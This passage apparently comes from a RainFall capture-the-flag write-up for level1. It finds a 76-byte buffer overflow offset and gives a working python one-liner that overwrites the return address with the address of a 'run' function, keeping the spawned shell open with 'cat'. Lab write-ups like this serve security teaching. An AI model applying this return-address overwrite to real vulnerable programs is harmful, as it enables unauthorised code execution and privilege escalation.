The value 0x63413563 corresponds to an offset of 76 bytes, according to the pattern generator.
So, we need to send:
- 76 bytes of padding
- address of the run function (0x08048444)

Final exploit:
```bash
level1@RainFall:~$ (python -c "import sys; sys.stdout.write(b'AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEFFFFFFFFFFGGGGGGGGGGHHHHHH\x44\x84\x04\x08')" && cat) | ./level1

